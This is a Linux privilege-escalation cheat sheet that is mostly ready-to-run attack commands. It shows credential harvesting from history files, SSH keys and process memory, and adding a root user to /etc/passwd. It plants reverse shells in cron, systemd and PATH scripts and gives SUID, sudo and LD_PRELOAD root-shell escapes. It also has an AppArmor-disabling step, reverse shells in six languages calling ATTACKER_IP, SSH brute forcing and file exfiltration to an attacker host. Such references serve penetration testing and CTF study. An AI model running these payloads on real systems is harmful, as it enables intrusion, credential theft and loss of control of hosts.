# Linux Privilege Escalation Methodology

Comprehensive reference for Linux privilege escalation techniques covering enumeration, credential harvesting, file permission abuse, SUID/capabilities/sudo exploitation, kernel exploits, and automated tooling.

---

## Enumeration

### User and System Information
```bash
id
whoami
hostname
cat /etc/passwd
cat /etc/passwd | grep -v "nologin\|false" | cut -d: -f1
sudo -l
cat /etc/issue
cat /etc/os-release
uname -a
uname -r
arch
```

### Running Processes
```bash
ps aux
ps aux | grep root
ps u -C <process_name>
watch -n 1 "ps aux | grep pass"
cat /proc/<PID>/status
grep Uid /proc/<PID>/status
```

### Network Information
```bash
ip a
ifconfig -a
route
routel
ip route
ss -anp
netstat -anp
ss -tulpn
cat /etc/iptables/rules.v4
iptables -L -n -v
```

### Scheduled Tasks (Cron Jobs)
```bash
ls -lah /etc/cron*
cat /etc/crontab
crontab -l
sudo crontab -l
grep "CRON" /var/log/syslog
cat /var/log/cron.log
```

### Installed Software
```bash
dpkg -l                    # Debian/Ubuntu
rpm -qa                    # Red Hat/CentOS
dpkg -l | grep <package>
```

### File System and Permissions
```bash
# World-writable directories
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null

# World-writable files
find / -writable -type f 2>/dev/null
find / -perm -o w -type f 2>/dev/null

# SUID binaries
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 2>/dev/null

# SGID binaries
find / -perm -g=s -type f 2>/dev/null
find / -perm -2000 2>/dev/null

# Files owned by root with SUID
find / -user root -perm -4000 2>/dev/null

# Check shadow/passwd permissions
ls -la /etc/shadow
ls -la /etc/passwd
```

### Mounted File Systems
```bash
mount
cat /etc/fstab
lsblk
fdisk -l
```

### Kernel Modules
```bash
lsmod
/sbin/modinfo <module_name>
```

### Capabilities
```bash
getcap -r / 2>/dev/null
/usr/sbin/getcap -r / 2>/dev/null
```

### Environment Variables
```bash
env
printenv
echo $PATH
echo $HOME
```

---

## Exposed Confidential Information

### User History and Config Files
```bash
cat ~/.bash_history
cat /home/*/.bash_history
cat ~/.zsh_history
cat ~/.mysql_history
cat ~/.psql_history
cat ~/.bashrc
cat ~/.profile
cat ~/.bash_profile

# SSH keys
ls -la ~/.ssh/
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys

# Credentials in environment
env | grep -i pass
env | grep -i key
env | grep -i secret
```

### Service Configuration Files
```bash
cat /etc/apache2/apache2.conf
cat /etc/nginx/nginx.conf
cat /var/www/html/config.php
cat /etc/mysql/my.cnf
cat /var/www/html/wp-config.php
find / -name "*.conf" 2>/dev/null | xargs grep -i "pass\|key\|secret" 2>/dev/null
find / -name "config.*" 2>/dev/null
```

### Password Sniffing
```bash
sudo tcpdump -i lo -A | grep "pass"
sudo tcpdump -i any -A | grep -i "password\|user"
```

### Memory and Process Inspection
```bash
gdb -p <PID>
(gdb) generate-core-file
(gdb) quit
strings core.<PID> | grep -i pass
```

---

## Insecure File Permissions

### Writable /etc/passwd
```bash
# Generate password hash
openssl passwd <password>
openssl passwd -1 -salt xyz <password>

# Add new root user
echo 'root2:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
su root2
```

### Writable /etc/shadow
```bash
mkpasswd -m sha-512 <password>
# Replace root hash in /etc/shadow, then: su root
```

### Writable Cron Jobs
```bash
ls -la /etc/cron*
find /etc/cron* -type f -writable

# Add reverse shell to writable cron script
echo 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' >> /path/to/cron/script.sh

# Named pipe variant
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f' >> script.sh
```

### Writable Service Files
```bash
find /etc/systemd/system -writable -type f

# Modify service to execute payload
# [Service]
# ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
```

### Writable Scripts in PATH
```bash
echo $PATH
echo $PATH | tr ':' '\n' | xargs ls -ld

echo '#!/bin/bash' > /writable/path/command
echo 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' >> /writable/path/command
chmod +x /writable/path/command
```

---

## SUID Binary Exploitation

### Find SUID Binaries
```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
```

### Common SUID Exploits

**find**
```bash
find /home -exec /bin/bash -p \;
find . -exec /bin/sh -p \; -quit
```

**vim**
```bash
vim -c ':!/bin/sh'
```

**bash**
```bash
bash -p
```

**less/more**
```bash
less /etc/passwd
!/bin/sh
```

**nano**
```bash
nano
# Ctrl+R, Ctrl+X
reset; sh 1>&0 2>&0
```

**cp**
```bash
cp /etc/passwd /tmp/passwd
echo 'root2:HASH:0:0:root:/root:/bin/bash' >> /tmp/passwd
cp /tmp/passwd /etc/passwd
```

**awk**
```bash
awk 'BEGIN {system("/bin/sh")}'
```

**python/perl/ruby/lua**
```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
perl -e 'exec "/bin/sh";'
ruby -e 'exec "/bin/sh"'
lua -e 'os.execute("/bin/sh")'
```

**tar**
```bash
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

**zip**
```bash
zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/sh"
```

**git**
```bash
git help status
!/bin/sh
```

**nmap (older versions)**
```bash
nmap --interactive
!sh
```

> Reference: https://gtfobins.github.io/ for the full list of exploitable binaries.

---

## Capabilities Exploitation

### Find Capabilities
```bash
getcap -r / 2>/dev/null
```

### cap_setuid (python/perl/ruby)
```bash
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'
```

### cap_dac_read_search (tar)
```bash
tar cvf shadow.tar /etc/shadow
tar -xvf shadow.tar
cat etc/shadow
```

### cap_chown (python)
```bash
python -c 'import os; os.chown("/etc/shadow", 1000, 1000)'
```

---

## Sudo Abuse

### Check Sudo Permissions
```bash
sudo -l
```

### Common Sudo Exploits

**Full sudo access**
```bash
sudo su
sudo -i
sudo /bin/bash
```

**NOPASSWD entries**
```bash
# If: (ALL) NOPASSWD: /usr/bin/find
sudo find /home -exec /bin/bash \;
```

**LD_PRELOAD**
```c
// shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```
```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so <allowed_command>
```

**LD_LIBRARY_PATH**
```bash
ldd /usr/bin/apache2
gcc -fPIC -shared -o libcrypt.so.1 shell.c
sudo LD_LIBRARY_PATH=/tmp apache2
```

**Common sudo command exploits (GTFOBins)**
```bash
sudo vim -c ':!/bin/sh'
sudo less /etc/hosts        # then !/bin/sh
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /home -exec /bin/bash \;
sudo man man                 # then !/bin/sh
sudo git -p help             # then !/bin/sh
sudo ftp                     # then !/bin/sh
sudo apt-get changelog apt   # then !/bin/sh

# Docker
sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Nmap
echo "os.execute('/bin/sh')" > /tmp/shell.nse
sudo nmap --script=/tmp/shell.nse

# Systemctl
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
sudo systemctl link $TF
sudo systemctl enable --now $TF
/bin/bash -p

# tcpdump
COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
```

### AppArmor Bypass
```bash
aa-status
sudo aa-complain /path/to/binary
sudo systemctl stop apparmor
sudo systemctl disable apparmor
```

---

## Kernel Exploits

### Enumeration
```bash
uname -a
uname -r
cat /proc/version
cat /etc/issue
cat /etc/*-release
lsb_release -a
uname -m
arch
```

### Search for Exploits
```bash
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"
searchsploit linux kernel 4.4.0
```

### Notable Kernel Exploits

| CVE | Name | Affected Versions |
|-----|------|-------------------|
| CVE-2016-5195 | Dirty COW | Kernel 2.6.22 - 3.9 |
| CVE-2017-16995 | eBPF | Ubuntu 16.04, Kernel 4.4.0-116 |
| CVE-2021-3493 | OverlayFS | Ubuntu 20.10, Kernel < 5.11 |
| CVE-2021-4034 | PwnKit (Polkit) | All versions since 2009 |
| CVE-2022-0847 | Dirty Pipe | Kernel 5.8 - 5.16.11 |
| CVE-2022-2586 | nft_object UAF | Kernel 5.4 - 5.18.14 |

### Compilation Tips
```bash
gcc exploit.c -o exploit
gcc -m32 exploit.c -o exploit32    # 32-bit
gcc -static exploit.c -o exploit   # Static (no dependencies)
file exploit                       # Check architecture
```

---

## Automated Enumeration Tools

### LinPEAS
```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas_output.txt
```

### LinEnum
```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh && ./LinEnum.sh
```

### Linux Exploit Suggester
```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh && ./linux-exploit-suggester.sh
```

### unix-privesc-check
```bash
unix-privesc-check standard > output.txt
unix-privesc-check detailed > output.txt
```

### pspy (Process Monitor Without Root)
```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64 && ./pspy64
```

---

## Reverse Shells

### Bash
```bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f
```

### Python
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Netcat
```bash
nc -e /bin/sh ATTACKER_IP PORT
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f
```

### Perl
```bash
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### PHP
```bash
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Ruby
```bash
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

---

## Shell Upgrade
```bash
# Python PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Fully interactive shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo; fg
export TERM=xterm
export SHELL=/bin/bash

# Script command
/usr/bin/script -qc /bin/bash /dev/null
```

---

## Password Cracking

### Unshadow and Crack
```bash
unshadow passwd shadow > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
hashcat -m 1800 -a 0 unshadowed.txt /usr/share/wordlists/rockyou.txt
```

### Brute Force SSH
```bash
hydra -l user -P wordlist.txt ssh://TARGET_IP -t 4
medusa -h TARGET_IP -u user -P wordlist.txt -M ssh
```

---

## File Transfer

### Download to Target
```bash
wget http://ATTACKER_IP/file
curl http://ATTACKER_IP/file -o file
echo "BASE64_STRING" | base64 -d > file
```

### Upload from Target
```bash
scp file user@ATTACKER_IP:/path/
curl -F "file=@file" http://ATTACKER_IP/upload
```

---

## Methodology Summary

1. Run automated enumeration (LinPEAS, LinEnum)
2. Check sudo permissions (`sudo -l`)
3. Find SUID binaries and capabilities
4. Search for writable files (cron jobs, services, /etc/passwd)
5. Hunt for credentials (history, configs, environment)
6. Check for kernel vulnerabilities (use as last resort)
7. Reference GTFOBins for binary exploitation techniques

---

## Resources

- GTFOBins: https://gtfobins.github.io/
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- HackTricks: https://book.hacktricks.xyz/
- Linux Kernel Exploits: https://github.com/SecWiki/linux-kernel-exploits
